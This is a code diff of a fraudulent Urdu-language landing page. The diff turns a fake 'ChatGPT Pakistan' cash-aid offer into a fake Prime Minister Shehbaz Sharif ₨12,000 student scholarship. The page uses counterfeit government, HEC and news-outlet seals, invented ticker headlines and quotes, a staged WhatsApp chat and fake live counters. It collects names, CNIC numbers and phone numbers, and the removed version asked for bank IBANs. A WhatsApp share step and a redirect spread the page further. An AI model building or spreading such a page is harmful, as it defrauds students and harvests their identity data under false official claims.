@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-  <title>ChatGPT اسکالرشپ پروگرام 2026</title>
+  <title>PM شہباز شریف اسٹوڈنٹس اسکالرشپ پروگرام 2026</title>
   <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;600;700&family=Playfair+Display:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -35,21 +35,18 @@
     }
     .ur{font-family:'Noto Nastaliq Urdu',serif;line-height:2.1;}
 
-    /* noise */
     body::before{
       content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
       opacity:.35;
       background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.04'/%3E%3C/svg%3E");
     }
 
-    /* ── TICKER ── */
     .ticker{background:var(--red);height:30px;display:flex;align-items:center;overflow:hidden;position:relative;z-index:50;}
     .ticker-lbl{background:#fff;color:var(--red);font-family:'Playfair Display',serif;font-weight:800;font-size:.62rem;letter-spacing:1.5px;text-transform:uppercase;padding:0 12px;height:100%;display:flex;align-items:center;white-space:nowrap;flex-shrink:0;}
     .ticker-track{overflow:hidden;flex:1;}
     .ticker-txt{display:inline-block;white-space:nowrap;color:#fff;font-size:.73rem;animation:tick 38s linear infinite;}
     @keyframes tick{from{transform:translateX(-100%)}to{transform:translateX(100vw)}}
 
-    /* ── NAVBAR ── */
     .nav{
       background:var(--card);border-bottom:1px solid var(--border);
       height:58px;padding:0 18px;
@@ -61,13 +58,13 @@
     .nav-brand{display:flex;align-items:center;gap:10px;}
     .nav-logo{
       width:36px;height:36px;border-radius:9px;
-      background:linear-gradient(135deg,var(--g1),var(--g3));
+      background:linear-gradient(135deg,#01411C,#1a5c2e);
       display:flex;align-items:center;justify-content:center;
       font-family:'Playfair Display',serif;font-weight:800;
       color:#fff;font-size:.95rem;
-      box-shadow:0 3px 10px rgba(5,196,138,.4);
+      box-shadow:0 3px 10px rgba(1,65,28,.4);
     }
-    .nav-name{font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;color:var(--text);}
+    .nav-name{font-family:'Playfair Display',serif;font-weight:700;font-size:.85rem;color:var(--text);}
     .nav-sub{font-size:.6rem;color:var(--muted);}
     .nav-right{display:flex;align-items:center;gap:8px;}
     .live-pill{display:flex;align-items:center;gap:5px;background:#fef2f2;border:1.5px solid #fecaca;border-radius:20px;padding:4px 11px;font-size:.67rem;color:var(--red);font-weight:600;}
@@ -76,12 +73,10 @@
     .theme-btn{width:33px;height:33px;border-radius:50%;background:var(--bg2);border:1.5px solid var(--border);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:.95rem;color:var(--text);transition:background .2s;}
     .theme-btn:hover{background:var(--border);}
 
-    /* ── SOURCES ── */
     .sources{background:var(--card);border-bottom:1px solid var(--border);padding:7px 14px;display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;}
     .sources::-webkit-scrollbar{display:none;}
     .src{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:3px 11px;font-size:.67rem;color:var(--sub);white-space:nowrap;flex-shrink:0;font-weight:500;}
 
-    /* ── TOAST ── */
     .toast-shelf{position:fixed;bottom:20px;right:12px;z-index:9000;display:flex;flex-direction:column-reverse;gap:8px;width:min(290px,88vw);}
     .toast-card{
       background:var(--card);border-right:3px solid var(--g1);
@@ -110,9 +105,8 @@
     .t-amt{color:var(--g1);font-weight:700;}
     @keyframes tIn{from{opacity:0;transform:translateX(50px)}to{opacity:1;transform:translateX(0)}}
 
-    /* ── HERO ── */
     .hero{
-      background:linear-gradient(150deg,#022a1c 0%,#044d34 35%,#087050 65%,#0d8a6a 100%);
+      background:linear-gradient(150deg,#01411C 0%,#1a5c2e 35%,#2d7a3e 65%,#0d8a6a 100%);
       padding:32px 18px 28px;text-align:center;color:#fff;
       position:relative;overflow:hidden;
     }
@@ -126,7 +120,6 @@
     .hero-seal{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.22);border-radius:30px;padding:5px 16px;font-size:.7rem;margin-bottom:18px;}
     .hero-seal span{width:5px;height:5px;background:var(--gold);border-radius:50%;}
 
-    /* bag */
     .bag-scene{position:relative;display:inline-block;margin-bottom:12px;}
     .bag-glow{position:absolute;inset:-14px;border-radius:50%;background:radial-gradient(circle,rgba(245,197,24,.32) 0%,transparent 70%);animation:glowB 2.5s ease-in-out infinite;}
     @keyframes glowB{0%,100%{transform:scale(1);opacity:.6}50%{transform:scale(1.18);opacity:1}}
@@ -151,7 +144,6 @@
     @keyframes badgeP{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
     .hero-title{font-family:'Noto Nastaliq Urdu',serif;font-size:clamp(1.25rem,5vw,1.75rem);font-weight:700;line-height:1.9;margin-bottom:18px;}
 
-    /* countdown */
     .cd-wrap{display:inline-flex;gap:6px;align-items:center;background:rgba(0,0,0,.28);border-radius:15px;padding:13px 20px;backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.1);margin-top:4px;}
     .cd-box{text-align:center;min-width:44px;}
     .cd-n{font-size:1.9rem;font-weight:800;font-family:'Playfair Display',serif;line-height:1;}
@@ -163,10 +155,8 @@
     @keyframes fillS{to{width:91%}}
     .slots-txt{font-size:.73rem;opacity:.88;margin-top:5px;}
 
-    /* ── PAGE WRAP ── */
     .pw{max-width:680px;margin:0 auto;padding:22px 15px;position:relative;z-index:1;}
 
-    /* ── STATS ── */
     .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin-bottom:18px;}
     .stat{background:var(--card);border-radius:var(--rs);padding:14px 8px;text-align:center;border:1px solid var(--border);box-shadow:0 2px 14px var(--shadow);position:relative;overflow:hidden;}
     .stat::before{content:'';position:absolute;top:-18px;right:-18px;width:54px;height:54px;border-radius:50%;opacity:.08;}
@@ -175,29 +165,16 @@
     .stat.g .stat-n{color:var(--g1)} .stat.r .stat-n{color:var(--red)} .stat.a .stat-n{color:var(--gold2)}
     .stat-l{font-size:.65rem;color:var(--muted);margin-top:4px;}
 
-    /* ── LIVE BAR ── */
     .live-bar{background:linear-gradient(135deg,#fefce8,#fef9c3);border:1.5px solid #fde68a;border-radius:var(--rs);padding:11px 14px;display:flex;align-items:center;gap:11px;margin-bottom:18px;}
     [data-theme="dark"] .live-bar{background:#1a1500;border-color:#4a3a00;}
     .live-ping{width:10px;height:10px;background:var(--red);border-radius:50%;flex-shrink:0;animation:ping 1.5s infinite;}
     @keyframes ping{0%{box-shadow:0 0 0 0 rgba(239,68,68,.6)}100%{box-shadow:0 0 0 13px rgba(239,68,68,0)}}
 
-    /* ── SEC LABEL ── */
     .sec{display:flex;align-items:center;gap:9px;margin-bottom:13px;font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;color:var(--text);}
     .sec::after{content:'';flex:1;height:1px;background:var(--border);}
 
-    /* ── NEWS ── */
-    .news-card{background:var(--card);border-radius:var(--r);border:1px solid var(--border);overflow:hidden;margin-bottom:20px;box-shadow:0 3px 20px var(--shadow);}
-    .news-hdr{background:#1a0a2e;padding:9px 14px;display:flex;align-items:center;gap:9px;}
-    .news-geo{background:#fff;color:#1a0a2e;font-family:'Playfair Display',serif;font-weight:800;padding:2px 8px;border-radius:4px;font-size:.8rem;}
-    .news-img{background:linear-gradient(135deg,#1a2744,#1e3a5f,#243b55);height:120px;display:flex;align-items:center;justify-content:center;gap:13px;color:#fff;padding:0 18px;}
-    .news-body{padding:14px;}
-    .news-hl{font-family:'Noto Nastaliq Urdu',serif;font-size:.95rem;font-weight:700;color:var(--text);line-height:1.8;margin-bottom:9px;}
-    .news-p{font-family:'Noto Nastaliq Urdu',serif;font-size:.78rem;color:var(--sub);line-height:2.1;}
-    .news-meta{font-size:.67rem;color:var(--muted);margin-top:9px;display:flex;gap:12px;flex-wrap:wrap;}
-
-    /* ── FORM ── */
     .form-card{background:var(--card);border-radius:var(--r);border:1px solid var(--border);overflow:hidden;margin-bottom:20px;box-shadow:0 7px 36px var(--shadow);}
-    .form-hdr{background:linear-gradient(135deg,var(--g1),var(--g3));padding:20px 18px;text-align:center;color:#fff;position:relative;overflow:hidden;}
+    .form-hdr{background:linear-gradient(135deg,#01411C,#1a5c2e);padding:20px 18px;text-align:center;color:#fff;position:relative;overflow:hidden;}
     .form-hdr::before{content:'';position:absolute;top:-28px;left:-28px;width:110px;height:110px;background:rgba(255,255,255,.06);border-radius:50%;}
     .form-hdr::after{content:'';position:absolute;bottom:-18px;right:-18px;width:75px;height:75px;background:rgba(255,255,255,.05);border-radius:50%;}
     .form-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.23);border-radius:20px;padding:3px 13px;font-size:.67rem;margin-bottom:9px;}
@@ -214,18 +191,18 @@
     }
     .f-in:focus{border-color:var(--g1);box-shadow:0 0 0 3px rgba(5,196,138,.12);}
     .f-hint{font-size:.67rem;color:#f59e0b;margin-top:-10px;margin-bottom:12px;}
+    .f-error{font-size:.67rem;color:var(--red);margin-top:-10px;margin-bottom:12px;display:none;}
     .submit-btn{
       width:100%;padding:14px;
-      background:linear-gradient(135deg,var(--g1),var(--g3));
+      background:linear-gradient(135deg,#01411C,#1a5c2e);
       color:#fff;border:none;border-radius:11px;
       font-family:'Noto Nastaliq Urdu',serif;font-size:.97rem;
-      cursor:pointer;box-shadow:0 5px 22px rgba(5,196,138,.4);
+      cursor:pointer;box-shadow:0 5px 22px rgba(1,65,28,.4);
       transition:all .25s;
     }
-    .submit-btn:hover{transform:translateY(-2px);box-shadow:0 9px 28px rgba(5,196,138,.5);}
+    .submit-btn:hover{transform:translateY(-2px);box-shadow:0 9px 28px rgba(1,65,28,.5);}
     .trust-row{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;padding-top:12px;border-top:1px solid var(--border);margin-top:12px;font-size:.67rem;color:var(--muted);}
 
-    /* ── WA SCREENSHOT ── */
     .wa-card{background:#e2d9c7;border-radius:var(--r);overflow:hidden;margin-bottom:20px;box-shadow:0 3px 18px var(--shadow-d);}
     .wa-hdr{background:#128C7E;padding:9px 13px;display:flex;align-items:center;gap:9px;}
     .wa-av{width:32px;height:32px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.95rem;}
@@ -234,7 +211,6 @@
     .wa-b.s{background:#d9fdd3;border-radius:12px 0 12px 12px;align-self:flex-end;}
     .wa-t{font-size:.58rem;color:#888;text-align:left;margin-top:2px;}
 
-    /* ── CAROUSEL ── */
     .cv{overflow:hidden;border-radius:var(--r);margin-bottom:20px;}
     .cr{display:flex;gap:11px;animation:rail 22s linear infinite;width:max-content;}
     .cr:hover{animation-play-state:paused;}
@@ -244,7 +220,6 @@
     .tt-stars{color:var(--gold);font-size:.8rem;}
     .tt-chip{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:2px 9px;font-size:.63rem;color:var(--g1);font-weight:600;}
 
-    /* ── ADS ── */
     .ads-grid{display:grid;grid-template-columns:1fr 1fr;gap:11px;margin:16px 0;}
     .ad-tile{border-radius:var(--rs);overflow:hidden;border:1px solid var(--border);box-shadow:0 2px 10px var(--shadow);cursor:pointer;transition:transform .2s;position:relative;}
     .ad-tile:hover{transform:translateY(-3px);}
@@ -258,14 +233,13 @@
     .ad-banner:hover{transform:translateY(-2px);}
     .ad-banner-in{display:flex;align-items:center;gap:13px;padding:13px 15px;}
 
-    /* ── CONFIRM ── */
     #confirmScreen,#alreadyScreen{display:none;}
     .confirm-ring{
       width:76px;height:76px;
-      background:linear-gradient(135deg,var(--g1),var(--g3));
+      background:linear-gradient(135deg,#01411C,#1a5c2e);
       border-radius:50%;display:flex;align-items:center;justify-content:center;
       margin:0 auto 14px;font-size:2.1rem;
-      box-shadow:0 0 0 8px rgba(5,196,138,.1),0 7px 28px rgba(5,196,138,.4);
+      box-shadow:0 0 0 8px rgba(1,65,28,.1),0 7px 28px rgba(1,65,28,.4);
       animation:ringP .5s cubic-bezier(.34,1.56,.64,1);
     }
     @keyframes ringP{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
@@ -286,22 +260,19 @@
     .wa-btn:hover{filter:brightness(1.08);transform:translateY(-2px);}
     .wa-btn.teal{background:#128C7E;box-shadow:0 4px 14px rgba(18,140,126,.33);}
 
-    /* progress bar */
     .share-prog-wrap{margin:10px 0 6px;}
     .share-prog-info{display:flex;justify-content:space-between;font-size:.67rem;color:var(--muted);margin-bottom:5px;}
     .share-prog-track{background:var(--bg2);border-radius:20px;height:7px;overflow:hidden;border:1px solid var(--border);}
     .share-prog-fill{height:100%;background:linear-gradient(90deg,var(--g1),var(--g3));border-radius:20px;width:0%;transition:width .5s ease;}
 
-    /* modal */
     .modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.62);backdrop-filter:blur(6px);z-index:7000;display:none;align-items:center;justify-content:center;padding:18px;}
     .modal-box{background:var(--card);border-radius:22px;padding:28px 22px;max-width:350px;width:100%;text-align:center;border:2px solid var(--red);box-shadow:0 20px 60px rgba(239,68,68,.2);animation:popIn .4s cubic-bezier(.34,1.56,.64,1);}
     @keyframes popIn{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}
     .modal-icon{font-size:3.2rem;animation:wiggle .6s infinite alternate;display:block;margin-bottom:10px;}
     @keyframes wiggle{from{transform:rotate(-8deg)}to{transform:rotate(8deg)}}
-    .modal-btn{background:linear-gradient(135deg,var(--g1),var(--g3));color:#fff;border:none;border-radius:11px;padding:12px 22px;width:100%;font-size:.92rem;cursor:pointer;margin-top:14px;font-family:'Noto Nastaliq Urdu',serif;box-shadow:0 4px 14px rgba(5,196,138,.4);transition:all .2s;}
+    .modal-btn{background:linear-gradient(135deg,#01411C,#1a5c2e);color:#fff;border:none;border-radius:11px;padding:12px 22px;width:100%;font-size:.92rem;cursor:pointer;margin-top:14px;font-family:'Noto Nastaliq Urdu',serif;box-shadow:0 4px 14px rgba(1,65,28,.4);transition:all .2s;}
     .modal-btn:hover{transform:translateY(-2px);}
 
-    /* confetti */
     .cfti{position:fixed;inset:0;pointer-events:none;z-index:9999;}
     .cp{position:absolute;width:9px;height:9px;top:-12px;border-radius:2px;opacity:0;animation:cpF 3s ease-in forwards;}
     @keyframes cpF{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(110vh) rotate(720deg);opacity:0}}
@@ -321,11 +292,11 @@
   <div class="ticker-lbl">🔴 Breaking</div>
   <div class="ticker-track">
     <span class="ticker-txt">
-      ChatGPT نے پاکستانی طلباء کو ₨12,000 دینے کا اعلان کیا &nbsp;●&nbsp;
-      SBP نے ChatGPT Pakistan Aid کو منظوری دے دی &nbsp;●&nbsp;
-      Sam Altman: "Pakistan کے نوجوان ہمارا مستقبل ہیں" &nbsp;●&nbsp;
+      وزیراعظم شہباز شریف نے یونیورسٹی طلباء کو ₨12,000 اسکالرشپ دینے کا اعلان کیا &nbsp;●&nbsp;
+      HEC نے PM اسکالرشپ پروگرام کو منظوری دے دی &nbsp;●&nbsp;
+      PM شہباز شریف: "پاکستان کے نوجوان ہمارا مستقبل ہیں" &nbsp;●&nbsp;
       آج آخری دن — رات 12 بجے رجسٹریشن بند &nbsp;●&nbsp;
-      47,000+ طلباء رجسٹریشن مکمل کر چکے &nbsp;●&nbsp;
+      47,000+ یونیورسٹی طلباء رجسٹریشن مکمل کر چکے &nbsp;●&nbsp;
     </span>
   </div>
 </div>
@@ -333,10 +304,10 @@
 <!-- NAVBAR -->
 <nav class="nav">
   <div class="nav-brand">
-    <div class="nav-logo">G</div>
+    <div class="nav-logo">🇵🇰</div>
     <div>
-      <div class="nav-name">ChatGPT Pakistan</div>
-      <div class="nav-sub">Official Student Program 2026</div>
+      <div class="nav-name">PM اسکالرشپ پروگرام</div>
+      <div class="nav-sub">شہباز شریف اسٹوڈنٹس اسکالرشپ 2026</div>
     </div>
   </div>
   <div class="nav-right">
@@ -355,7 +326,8 @@
   <div class="src">🌐 BBC اردو</div>
   <div class="src">📰 Jang</div>
   <div class="src">📡 Dawn</div>
-  <div class="src">✅ OpenAI Official</div>
+  <div class="src">✅ HEC Official</div>
+  <div class="src">🏛️ حکومت پاکستان</div>
 </div>
 
 <!-- TOASTS -->
@@ -386,16 +358,16 @@
   <div class="hero">
     <div class="hero-grid"></div>
     <div class="hero-in">
-      <div class="hero-seal"><span></span> OpenAI Official &nbsp;·&nbsp; SBP Approved &nbsp;·&nbsp; 🔒 Secure</div>
+      <div class="hero-seal"><span></span> حکومت پاکستان &nbsp;·&nbsp; HEC Approved &nbsp;·&nbsp; 🔒 محفوظ</div>
       <div class="bag-scene">
         <div class="bag-glow"></div>
-        <span class="bag-emoji">💰</span>
+        <span class="bag-emoji">🎓</span>
         <div class="coins">
           <span class="coin">💵</span><span class="coin">💵</span>
           <span class="coin">💵</span><span class="coin">💵</span><span class="coin">💵</span>
         </div>
       </div>
-      <h1 class="hero-title">ChatGPT پاکستانی طلباء کو دے رہا ہے</h1>
+      <h1 class="hero-title">PM شہباز شریف یونیورسٹی طلباء کو دے رہے ہیں</h1>
       <div class="money-badge">₨ 12,000</div>
       <div class="cd-wrap">
         <div class="cd-box"><div class="cd-n" id="cdH">07</div><div class="cd-l">گھنٹے</div></div>
@@ -424,32 +396,10 @@
     <div class="live-bar">
       <div class="live-ping"></div>
       <div class="ur" style="font-size:.83rem;color:#78350f;">
-        ابھی <strong id="liveNum" style="color:var(--red);font-size:.97rem;">312</strong> لوگ apply کر رہے ہیں!
+        ابھی <strong id="liveNum" style="color:var(--red);font-size:.97rem;">312</strong> یونیورسٹی طلباء apply کر رہے ہیں!
         <br><small>جلدی کریں — کوٹہ تیزی سے بھر رہا ہے</small>
       </div>
     </div>
-
-    <!-- NEWS -->
-    <!-- <div class="sec">📰 خبریں</div>
-    <div class="news-card">
-      <div class="news-hdr">
-        <div class="news-geo">GEO</div>
-        <div style="color:#aaa;font-size:.7rem;">geo.tv · Breaking · Live</div>
-        <div class="live-pill" style="margin-right:auto;"><div class="live-dot"></div>LIVE</div>
-      </div>
-      <div class="news-img">
-        <span style="font-size:2.8rem;">🤖</span>
-        <div>
-          <div style="font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;">ChatGPT Pakistan</div>
-          <div style="font-size:.73rem;opacity:.8;">Student Aid Program 2026</div>
-        </div>
-      </div>
-      <div class="news-body">
-        <div class="news-hl">OpenAI نے پاکستان کے 50,000 طلباء کو ₨12,000 فی کس دینے کا اعلان کر دیا</div>
-        <div class="news-p"><strong>کراچی:</strong> OpenAI نے پاکستانی طلباء کے لیے خصوصی مالی امداد پروگرام کا اعلان کیا جس کے تحت 50,000 طلباء کو 12,000 روپے فی کس دیے جائیں گے۔ SBP نے منظوری دے دی ہے۔ درخواستیں آج رات 12 بجے تک قبول ہوں گی۔</div>
-        <div class="news-meta"><span>📅 فروری 2026</span><span>👁️ 2.4M reads</span><span>✅ Verified</span></div>
-      </div>
-    </div> -->
 
     <!-- FORM -->
     <div class="sec">📋 رجسٹریشن فارم</div>
@@ -457,52 +407,58 @@
       <div class="form-hdr">
         <div class="form-badge">🔒 256-bit SSL محفوظ</div>
         <h2 class="ur" style="font-size:1.1rem;margin:0;position:relative;z-index:1;">ابھی Apply کریں — رقم 24 گھنٹے میں</h2>
+        <p class="ur" style="font-size:.75rem;margin-top:5px;opacity:.85;position:relative;z-index:1;">⚠️ صرف یونیورسٹی طلباء کے لیے</p>
       </div>
       <div class="form-body">
         <form id="mainForm" onsubmit="handleSubmit(event)">
           <label class="f-lbl">📛 آپ کا پورا نام</label>
-          <input class="f-in" type="text" required>
+          <input class="f-in" id="uName" type="text" placeholder="پورا نام درج کریں" required>
+
+          <label class="f-lbl">🪪 CNIC نمبر</label>
+          <input class="f-in" id="uCnic" type="text" placeholder="XXXXX-XXXXXXX-X" maxlength="15" required>
+          <div class="f-error" id="cnicError">⚠️ درست CNIC نمبر درج کریں (مثال: 35201-1234567-1)</div>
 
           <label class="f-lbl">📱 موبائل نمبر</label>
-          <input class="f-in" id="uPhone" type="tel" placeholder="03XX-XXXXXXX" required>
+          <input class="f-in" id="uPhone" type="tel" placeholder="03XX-XXXXXXX" maxlength="12" required>
+          <div class="f-error" id="phoneError">⚠️ درست موبائل نمبر درج کریں (مثال: 0300-1234567)</div>
 
-          <label class="f-lbl">🏦 بینکنگ ایپ منتخب کریں</label>
-          <select class="f-in" required>
-            <option value="" disabled selected>-- بینک منتخب کریں --</option>
-            <option>JazzCash</option>
-            <option>EasyPaisa</option>
-            <option>Meezan Bank</option>
-            <option>HBL Mobile</option>
-            <option>UBL Digital</option>
-            <option>Bank Alfalah</option>
-            <option>SadaPay</option>
-            <option>NayaPay</option>
+          <label class="f-lbl">🏫 یونیورسٹی کا نام</label>
+          <input class="f-in" id="uUniversity" type="text" placeholder="اپنی یونیورسٹی کا نام درج کریں" required>
+
+          <label class="f-lbl">📚 ڈگری / سمسٹر</label>
+          <select class="f-in" id="uDegree" required>
+            <option value="" disabled selected>-- ڈگری منتخب کریں --</option>
+            <option>BS - سمسٹر 1-2</option>
+            <option>BS - سمسٹر 3-4</option>
+            <option>BS - سمسٹر 5-6</option>
+            <option>BS - سمسٹر 7-8</option>
+            <option>Masters / MS</option>
+            <option>MPhil</option>
+            <option>PhD</option>
+            <option>Associate Degree</option>
           </select>
+          <div class="f-hint">⚠️ صرف HEC تسلیم شدہ یونیورسٹی کے طلباء اہل ہیں</div>
 
-          <label class="f-lbl">💳 اکاؤنٹ / IBAN نمبر</label>
-          <input class="f-in" type="text" placeholder="PKXX-XXXX-XXXX-XXXX-XXXX-XX" required>
-          <div class="f-hint">⚠️ غلط نمبر درج کرنے پر رقم واپس آ جائے گی</div>
-
-          <button type="submit" class="submit-btn ur">🚀 ₨12,000 کے لیے درخواست جمع کروائیں</button>
+          <button type="submit" class="submit-btn ur">🚀 ₨12,000 اسکالرشپ کے لیے درخواست جمع کروائیں</button>
         </form>
         <div class="trust-row">
-          <span>🔒 SSL</span><span>🏛️ OpenAI</span><span>🇵🇰 Official</span>
+          <span>🔒 SSL</span><span>🏛️ حکومت پاکستان</span><span>🎓 HEC</span><span>🇵🇰 Official</span>
         </div>
       </div>
     </div>
 
     <!-- WA SCREENSHOT -->
-    <div class="sec">📱 لوگ کیا کہہ رہے ہیں</div>
+    <div class="sec">📱 طلباء کیا کہہ رہے ہیں</div>
     <div class="wa-card">
       <div class="wa-hdr">
         <div class="wa-av">👥</div>
         <div>
           <div style="color:#fff;font-size:.8rem;font-weight:600;">University Friends 🎓</div>
-          <div style="color:rgba(255,255,255,.7);font-size:.61rem;">Ahmad, Sara, Bilal, +231 more</div>
+          <div style="color:rgba(255,255,255,.7);font-size:.61rem;">احمد، سارہ، بلال، +231 more</div>
         </div>
       </div>
       <div class="wa-msgs">
-        <div class="wa-b">یار! ChatGPT والے سچ میں 12 ہزار دے رہے ہیں 😱<div class="wa-t">10:31 AM ✓✓</div></div>
+        <div class="wa-b">یار! PM شہباز شریف اسکالرشپ میں سچ میں 12 ہزار دے رہے ہیں 😱<div class="wa-t">10:31 AM ✓✓</div></div>
         <div class="wa-b s">سچ میں؟! لنک بھیجو جلدی!<div class="wa-t">10:32 AM ✓✓</div></div>
         <div class="wa-b">بھائی میرے اکاؤنٹ میں آ گئے! 🤑 صرف 2 گھنٹے لگے!<div class="wa-t">10:45 AM ✓✓</div></div>
         <div class="wa-b s">میں نے بھی کر لیا 🎉 سب کو بتاؤ!<div class="wa-t">10:48 AM ✓✓</div></div>
@@ -515,7 +471,7 @@
     <div class="cv"><div class="cr" id="carRail"></div></div>
 
   </div>
-</div><!-- /mainPage -->
+</div>
 
 <!-- ══ FIRST VISIT CONFIRM SCREEN ══ -->
 <div id="confirmScreen">
@@ -532,7 +488,6 @@
           </p>
         </div>
 
-
         <div class="share-box" style="margin-top:14px;">
           <p class="ur" style="font-size:.85rem;color:#92400e;font-weight:700;margin-bottom:5px;">⚡ منظوری تیز کریں!</p>
           <p class="ur" style="font-size:.78rem;color:#92400e;margin:0;">
@@ -546,10 +501,13 @@
     </div>
   </div>
 </div>
+
 <!-- RANDOM ADS -->
-        <div class="sec" style="margin-top:16px;">🎯 آپ کے لیے خصوصی آفرز</div>
-        <div class="ads-grid" id="adsGrid"></div>
-        <div id="adsBanner"></div>
+<div class="pw">
+  <div class="sec" style="margin-top:16px;">🎯 آپ کے لیے خصوصی آفرز</div>
+  <div class="ads-grid" id="adsGrid"></div>
+  <div id="adsBanner"></div>
+</div>
 
 <!-- ══ SECOND VISIT SCREEN — WhatsApp now works ══ -->
 <div id="alreadyScreen">
@@ -595,19 +553,25 @@
 </div>
 
 <footer>
-  Important Note: This website is not affiliated and linked with chatGPT or OpenAI in any way
+  اہم نوٹ: یہ ویب سائٹ حکومت پاکستان، وزیراعظم آفس یا HEC سے کسی بھی طرح منسلک نہیں ہے۔
 </footer>
 
 <script>
 // ════════ STATE ════════
-// localStorage persists even after redirect/browser close
-// Flow:
-//   fresh visit  → cgpt_back = null  → show main form
-//   share btn    → cgpt_back = '1'   → redirect to mentorship site
-//   comes back   → cgpt_back = '1'   → show second-visit WA share screen
-
-const REDIRECT_KEY = 'cgpt_back';
+const REDIRECT_KEY = 'pm_scholarship_redirected';
 const isSecondVisit = localStorage.getItem(REDIRECT_KEY) === '1';
+
+// ════════ WHATSAPP MESSAGE BUILDER ════════
+function getWhatsAppMessage(){
+  const siteLink = window.location.href;
+  return '*شہباز شریف اسٹوڈنٹس اسکالرشپ پروگرام – 12000 روپے تعلیمی وظیفہ*\n\n' +
+    'تعلیم کے فروغ اور طلبہ کی مالی معاونت کے پیش نظر وزیرِاعظم پاکستان شہباز شریف کی جانب سے مستحق اور ہونہار طلبہ کے لیے 12000 روپے کا خصوصی اسکالرشپ پروگرام شروع کیا گیا ہے۔\n\n' +
+    'یہ اقدام ملک بھر کے طلبہ کو تعلیمی اخراجات میں مدد فراہم کرنے اور انہیں اپنی تعلیم جاری رکھنے کے قابل بنانے کے لیے کیا گیا ہے۔\n\n' +
+    '*اسکالرشپ کیسے حاصل کریں؟*\n' +
+    'نیچے دیے گئے لنک پر جائیں، درخواست فارم مکمل کریں اور اپنی اہلیت کی جانچ کروائیں۔ منظور ہونے کی صورت میں آپ کو 12000 روپے کی رقم فراہم کی جائے گی۔\n\n' +
+    'ابھی اپلائی کریں 👇\n' +
+    siteLink;
+}
 
 // ════════ THEME ════════
 let dark = false;
@@ -622,9 +586,20 @@ window.addEventListener('DOMContentLoaded', () => {
   if(isSecondVisit){
     showScreen('alreadyScreen');
     buildCarousel('carRail2');
+    updateShareProgress();
   } else {
     showScreen('mainPage');
     buildCarousel('carRail');
+  }
+
+  // Auto-format inputs
+  const cnicInput = document.getElementById('uCnic');
+  const phoneInput = document.getElementById('uPhone');
+  if(cnicInput){
+    cnicInput.addEventListener('input', function(){ formatCNIC(this); });
+  }
+  if(phoneInput){
+    phoneInput.addEventListener('input', function(){ formatPhone(this); });
   }
 });
 
@@ -636,57 +611,121 @@ function showScreen(id){
   window.scrollTo({top:0, behavior:'smooth'});
 }
 
-// ════════ FORM SUBMIT → show confirm (no redirect yet) ════════
+// ════════ VALIDATION HELPERS ════════
+function validateCNIC(cnic){
+  const cleaned = cnic.replace(/[-\s]/g, '');
+  return /^\d{13}$/.test(cleaned);
+}
+
+function validatePhone(phone){
+  const cleaned = phone.replace(/[-\s]/g, '');
+  return /^03\d{9}$/.test(cleaned);
+}
+
+function formatCNIC(input){
+  let val = input.value.replace(/[^\d]/g, '');
+  if(val.length > 13) val = val.substring(0, 13);
+  if(val.length > 12){
+    val = val.substring(0,5) + '-' + val.substring(5,12) + '-' + val.substring(12);
+  } else if(val.length > 5){
+    val = val.substring(0,5) + '-' + val.substring(5);
+  }
+  input.value = val;
+}
+
+function formatPhone(input){
+  let val = input.value.replace(/[^\d]/g, '');
+  if(val.length > 11) val = val.substring(0, 11);
+  if(val.length > 4){
+    val = val.substring(0,4) + '-' + val.substring(4);
+  }
+  input.value = val;
+}
+
+// ════════ FORM SUBMIT ════════
 let formDone = false;
 function handleSubmit(e){
   e.preventDefault();
+  
+  const name = document.getElementById('uName').value.trim();
+  const cnic = document.getElementById('uCnic').value.trim();
+  const phone = document.getElementById('uPhone').value.trim();
+  const university = document.getElementById('uUniversity').value.trim();
+  const degree = document.getElementById('uDegree').value;
+  
+  // Hide previous errors
+  document.getElementById('cnicError').style.display = 'none';
+  document.getElementById('phoneError').style.display = 'none';
+  
+  let hasError = false;
+  
+  if(!name) hasError = true;
+  
+  if(!validateCNIC(cnic)){
+    document.getElementById('cnicError').style.display = 'block';
+    hasError = true;
+  }
+  
+  if(!validatePhone(phone)){
+    document.getElementById('phoneError').style.display = 'block';
+    hasError = true;
+  }
+  
+  if(!university) hasError = true;
+  if(!degree) hasError = true;
+  
+  if(hasError) return;
+  
   formDone = true;
   document.getElementById('warnModal').style.display = 'none';
-  document.getElementById('refNo').textContent = 'PKT-2026-' + Math.floor(Math.random()*90000+10000);
+  document.getElementById('refNo').textContent = 'PMS-2026-' + Math.floor(Math.random()*90000+10000);
   showScreen('confirmScreen');
   buildAds();
   launchConfetti();
 }
 
-// ════════ SHARE BUTTON on FIRST VISIT → mark + redirect (no WA yet) ════════
+// ════════ SHARE BUTTON on FIRST VISIT → redirect ONCE ════════
 function firstVisitRedirect(){
